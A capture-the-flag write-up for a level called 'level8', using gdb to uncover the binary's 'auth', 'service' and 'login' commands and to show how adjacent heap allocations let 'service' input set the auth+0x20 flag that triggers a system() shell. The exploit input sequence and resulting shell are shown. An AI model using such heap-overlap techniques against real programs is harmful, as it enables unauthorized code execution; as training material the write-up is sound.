## level8
In `level8` as opposed to the others the call to `system()` is inside the `main()` function, running the program will make it print *nil nil* and when we try to disassembly the program the disassembled code it's huge comparing to the others, so going through it with __gdb__ will show  some texts that we could think to be the inputs to pass to this program<br>
```
0x080485c1 <+93>:	mov    eax,0x8048819
(gdb) x/s 0x8048819
0x8048819:	 "auth "
```
Righ after this I was faced with some *assembly code* that looks very weird to me *(probably because I don't speack it very well)*
```
0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
0x080485d1 <+109>:	seta   dl
0x080485d4 <+112>:	setb   al
```
After some search  I could find this [SO-POST](https://stackoverflow.com/questions/44630262/what-do-the-assembly-instructions-seta-and-setb-do-after-repz-cmpsb/44630741) that could clarify some parts and made me understand that it was comparing a string character by charater,<br> *why bother? why not just call `strcmp`?* maybe to try to make it more complicated ? and there are also a bunch of *flags* being set in this way of doing the comparasion.<br> The next string we will find in the dissableded code:
```
=> 0x08048642 <+222>:	lea    eax,[esp+0x20]
   0x08048646 <+226>:	mov    edx,eax
   0x08048648 <+228>:	mov    eax,0x804881f
   0x0804864d <+233>:	mov    ecx,0x5
   0x08048652 <+238>:	mov    esi,edx
   0x08048654 <+240>:	mov    edi,eax
   0x08048656 <+242>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048658 <+244>:	seta   dl
   0x0804865b <+247>:	setb   al
   
(gdb) x/s 0x804881f
0x804881f:	 "reset"
```
And the next
```
   0x0804867e <+282>:	mov    eax,0x8048825
   0x08048683 <+287>:	mov    ecx,0x6
   0x08048688 <+292>:	mov    esi,edx
   0x0804868a <+294>:	mov    edi,eax
   0x0804868c <+296>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804868e <+298>:	seta   dl
   0x08048691 <+301>:	setb   al
   
(gdb) x/s 0x8048825
0x8048825:	 "service"
```
And the last one
```
   0x080486bb <+343>:	mov    eax,0x804882d
   0x080486c0 <+348>:	mov    ecx,0x5
   0x080486c5 <+353>:	mov    esi,edx
   0x080486c7 <+355>:	mov    edi,eax
   0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080486cb <+359>:	seta   dl
   0x080486ce <+362>:	setb   al
   
(gdb) x/s 0x804882d
0x804882d:	 "login"
```
To get the flag in this level you have to login as ``` `auth ` ``` the `' '` at the end of `auth` is important after this you will see the start __address__ where the string *`auth `* is put
```
./level8
(nil), (nil)
auth
0x804a008, (nil)
```
After this we have two options, we can either enter *service plus any number greater than 15 (memory alignment)
```
service AAAAAAAAAAAAAAA OR service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$
``` 
or we can enter
```
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$
```
At the beginig of the program we can see a call to `malloc()` and the __address__:
```
 0x080485eb <+135>:	call   0x8048470 <malloc@plt>
 0x080485f0 <+140>:	mov    ds:0x8049aac,eax
```
This __address__ `0x8049aac` will be shared by *`auth `* and *`service`* then at the end of the program just before the `system()` call we will see this __address__ again
```
=> 0x080486e2 <+382>:	mov    eax,ds:0x8049aac
   0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:	test   eax,eax
   0x080486ec <+392>:	je     0x80486ff <main+411>
   0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
```
and if we check this address we will recognize it from the command line:
```
(gdb) x/4xw 0x8049aac
0x8049aac <auth>:	0x0804a008	0x0804a028	0x00000000	0x00000000
```
We can see that is this address that we are writing to when we enter ``` `auth ` ``` and `service` as the arguments to the program, we can see from the snippet above that the prgram is loading this __address__ to the register `eax` and then adding `0x20` to it:
|Address| | |
|-------|----|-----|
|0x8049aac| =| 0x0804a008|
|0x0804a008|+| 0x20|
|0x0804a028 |
